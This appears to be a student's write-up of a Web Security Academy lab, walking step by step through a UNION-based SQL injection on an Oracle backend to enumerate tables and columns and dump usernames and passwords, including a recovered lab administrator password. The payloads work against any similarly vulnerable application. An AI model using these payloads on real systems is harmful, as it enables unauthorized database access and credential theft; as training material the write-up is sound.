# SQL injection attack, listing the database contents on Oracle

1. SQLi: 
    - product category filter.
    - login function.
    - database contains a table that holds usernames and passwords.
2. Goal:
    - determine the name of this table and the columns it contains.
    - retrieve the contents of the table to obtain the username and password of all users.
    - log in as the `administrator` user.

### Analysis
- Website target: `https://0a8000820382b9718228c59900ed00a2.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. Find the number of columns.
```sql
' order by 2--
'-- I found 2 columns.
```

2. Find the data type of columns.
```sql
' union select 'a', 'a' from dual--
'-- Both columns are text.
```

3. Output the list of tables in the database.
```sql
SELECT * FROM all_tables --Oracle

' UNION SELECT TABLE_NAME, NULL FROM all_tables--
'-- I found USERS_FTICVX table.
```

4. Ouput the column names of the table.
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_FTICVX'--
'-- I found 2 columns: USERNAME_QNPMEH, PASSWORD_TRWRZM
```

5. Output usernames and passwords.
```sql
' union select USERNAME_QNPMEH, PASSWORD_TRWRZM from USERS_FTICVX--
'-- Username: administrator
-- Password: vtlnjrl413af7c8diaqd
```